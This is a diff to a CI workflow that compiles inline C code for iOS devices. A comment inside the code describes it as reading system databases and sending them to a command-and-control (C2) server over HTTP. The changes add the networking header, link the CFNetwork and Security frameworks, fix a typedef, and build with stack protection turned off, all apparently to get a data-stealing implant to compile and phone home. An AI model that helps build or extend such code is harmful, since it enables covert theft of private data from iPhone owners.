@@ -52,6 +52,7 @@ jobs:
            * Reads system databases and sends to C2 via HTTP
            */
           #include <CoreFoundation/CoreFoundation.h>
+          #include <CFNetwork/CFNetwork.h>
           #include <stdio.h>
           #include <string.h>
           #include <sys/stat.h>
@@ -76,7 +77,7 @@ jobs:
           typedef int (*sqlite3_close_func)(void*);
           typedef const char* (*sqlite3_errmsg_func)(void*);
            
-          typedef sqlite3_int64 int64_t;
+          typedef long long int64_t;
            
           static void *sql_lib = NULL;
           static sqlite3_open_func sql_open = NULL;
@@ -381,6 +382,7 @@ jobs:
             -miphoneos-version-min=15.0 \
             -target arm64-apple-ios15.0 \
             -Oz \
+            -framework CFNetwork -framework Security \
             -Wno-deprecated-declarations \
             -fno-stack-protector \
             -fPIC
@@ -430,6 +432,7 @@ jobs:
             -arch arm64 -arch arm64e \
             -miphoneos-version-min=15.0 \
             -fobjc-arc -dynamiclib -Oz \
+            -framework CFNetwork -framework Security \
             -Wno-deprecated-declarations \
             -Wno-availability \
             -exported_symbol _process
